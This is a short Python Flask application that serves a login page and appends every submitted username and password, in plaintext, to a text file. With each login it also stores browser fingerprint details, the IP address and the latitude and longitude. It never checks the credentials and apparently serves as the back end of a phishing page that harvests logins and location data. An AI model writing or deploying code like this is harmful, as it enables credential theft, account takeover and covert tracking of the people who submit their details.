from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    login_data = request.get_json()

    # Save data to txt file
    save_data_to_txt(login_data)

    return jsonify({'success': True, 'message': 'Login information saved successfully'})

def save_data_to_txt(data):
    with open('login_info.txt', 'a') as file:
        file.write("Login Info:\n")
        file.write(f"Username: {data['username']}\n")
        file.write(f"Password: {data['password']}\n")
        file.write(f"User Agent: {data['User Agent']}\n")
        file.write(f"Platform: {data['Platform']}\n")
        file.write(f"Language: {data['Language']}\n")
        file.write(f"Screen Width: {data['Screen Width']}\n")
        file.write(f"Screen Height: {data['Screen Height']}\n")
        file.write(f"Color Depth: {data['Color Depth']}\n")
        file.write(f"Browser Online: {data['Browser Online']}\n")
        file.write(f"IP Address: {data['IP Address']}\n")
        file.write(f"Latitude: {data['Latitude']}\n")
        file.write(f"Longitude: {data['Longitude']}\n\n")

if __name__ == '__main__':
    app.run(debug=True)

